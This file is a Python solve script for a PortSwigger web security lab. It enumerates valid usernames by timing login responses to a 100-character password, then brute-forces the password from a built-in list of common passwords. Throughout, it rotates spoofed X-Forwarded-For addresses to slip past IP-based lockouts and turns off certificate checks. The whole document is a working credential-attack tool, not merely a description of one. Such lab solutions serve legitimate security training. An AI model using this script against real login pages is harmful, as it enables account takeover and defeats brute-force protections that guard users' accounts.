#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Username enumeration via response timing.

Uses X-Forwarded-For rotation and a long password to identify the valid
username by timing, then brute-forces the password with IP rotation.
"""

import argparse
import re
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LONG_PASSWORD = "A" * 100

USERNAMES = [
    "carlos","root","admin","test","guest","info","adm","mysql","user","administrator",
    "oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico",
    "accware","action","addresses","adkit","admin2","admins","agentsmith","aid","aidan"
]

PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567",
    "dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master",
    "666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman"
]


def get_csrf(session: requests.Session, url: str, xff: str) -> str:
    r = session.get(url, headers={"X-Forwarded-For": xff})
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def timed_login(session: requests.Session, lab: str, username: str, password: str, xff: str) -> float:
    csrf = get_csrf(session, f"{lab}/login", xff)
    start = time.time()
    session.post(f"{lab}/login",
                 data={"csrf": csrf, "username": username, "password": password},
                 headers={"X-Forwarded-For": xff})
    return time.time() - start


def enumerate_username(session: requests.Session, lab: str, usernames: list[str]) -> str:
    timings: dict[str, float] = {}
    for i, username in enumerate(usernames):
        xff = f"1.1.1.{i % 254 + 1}"
        elapsed = timed_login(session, lab, username, LONG_PASSWORD, xff)
        timings[username] = elapsed
        print(f"  {username}: {elapsed:.2f}s")

    best = max(timings, key=lambda u: timings[u])
    print(f"[+] Valid username (slowest): {best} ({timings[best]:.2f}s)")
    return best


def brute_password(session: requests.Session, lab: str, username: str, passwords: list[str]) -> str:
    for i, password in enumerate(passwords):
        xff = f"2.2.2.{i % 254 + 1}"
        csrf = get_csrf(session, f"{lab}/login", xff)
        r = session.post(f"{lab}/login",
                         data={"csrf": csrf, "username": username, "password": password},
                         headers={"X-Forwarded-For": xff},
                         allow_redirects=False)
        if r.status_code == 302:
            print(f"[+] Password found: {password}")
            return password
    raise SystemExit("[-] Password not found")


def main():
    parser = argparse.ArgumentParser(description="Solve Auth Lab 5 (timing-based enumeration)")
    parser.add_argument("lab_url")
    parser.add_argument("--userlist")
    parser.add_argument("--passlist")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    usernames = open(args.userlist).read().splitlines() if args.userlist else USERNAMES
    passwords = open(args.passlist).read().splitlines() if args.passlist else PASSWORDS

    username = enumerate_username(s, lab, usernames)
    password = brute_password(s, lab, username, passwords)
    print(f"[+] Credentials: {username}:{password}")
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
